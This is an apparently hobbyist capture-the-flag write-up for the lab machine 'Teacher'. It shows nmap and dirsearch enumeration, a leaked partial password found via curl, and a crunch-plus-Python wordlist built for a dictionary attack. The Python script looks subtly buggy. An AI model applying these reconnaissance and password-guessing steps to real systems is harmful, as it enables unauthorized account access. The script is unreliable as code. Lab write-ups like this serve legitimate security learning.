## ------------>> Teacher <<----------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.153 -p-
---------

    Nmap scan report for 10.10.10.153
    Host is up (0.19s latency).
    Not shown: 65530 closed ports
    PORT      STATE    SERVICE         VERSION
    80/tcp    open     http            Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Blackhat highschool
    4494/tcp  filtered unknown
    6629/tcp  filtered nexgen-aux
    9209/tcp  filtered almobile-system
    38131/tcp filtered unknown

// Navigating to http://10.10.10.153/ , present us with a Highschool website

![Image 1]()

// Next we will use dirsearch to find directories or files on the website

    $python3 dirsearch.py -u http://10.10.10.153/ -t 100 
-----

    ...
    [06:46:36] 301 -  312B  - /fonts  ->  http://10.10.10.153/fonts/
    [06:46:36] 200 -    8KB - /gallery.html
    [06:46:37] 301 -  313B  - /images  ->  http://10.10.10.153/images/
    [06:46:37] 200 -   15KB - /images/
    [06:46:37] 200 -    8KB - /index.html
    [06:46:37] 301 -  317B  - /javascript  ->  http://10.10.10.153/javascript/
    [06:46:37] 200 -    1KB - /js/
    [06:46:38] 200 -  626B  - /manual/index.html
    [06:46:38] 301 -  313B  - /manual  ->  http://10.10.10.153/manual/
    [06:46:39] 301 -  313B  - /moodle  ->  http://10.10.10.153/moodle/
    ...

// Navigating to http://10.10.10.153/images/ we can see all the website photos, exept one - '5.png'

![Image 2]()

// When clicking this photo we can see that photo cannot be open due to error in the photo

![Image 3]()

// When checking the response to with 'curl' we get some information

    $ curl -i http://10.10.10.153/images/5.png
-------

    HTTP/1.1 200 OK
    Date: Thu, 26 Aug 2021 11:03:09 GMT
    Server: Apache/2.4.25 (Debian)
    Last-Modified: Wed, 27 Jun 2018 01:43:21 GMT
    ETag: "c8-56f95bd633644"
    Accept-Ranges: bytes
    Content-Length: 200
    Content-Type: image/png

    Hi Servicedesk,

    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

    Could you guys figure out what the last charachter is, or just reset it?

    Thanks,
    Giovanni

// Great!, we have partly password

// Next part its to complete the missing part of the password([Dictionary Attack](https://searchsecurity.techtarget.com/definition/dictionary-attack)), since we dont know what it is

// I come up with idea to combine [Crunch](https://tools.kali.org/password-attacks/crunch) password list maker tool and Python

// First we will make an password extention txt file with crunch(i limited from 1 to 3 characters)

    $ crunch 1 3 'abcdefghijklmnopqrstuvwxyz1234567890ls%^&*()_+-=@{}[]\/.,`~|#' -o pass_extention.txt

// Next i will make a little python script till 100000 passwords that will 

// add the extention from the extantion file to the existing pass (Th4C00lTheacha)

// !! NOTE !! the script work only for Teacher machine

    f2 = open("combined_pass.txt", "x")
    f = open("pass_extention.txt", "r")

    x = 1
    d = 100000

    while d > x:
       x +=1
       line1 = f.readline(x)
       pass1 = 'Th4C00lTheacha'
       combined = pass1 + line1

       f2.write(combined)


    f.close()
    f2.close()

// Now we got 'combined_pass.txt' passwords file




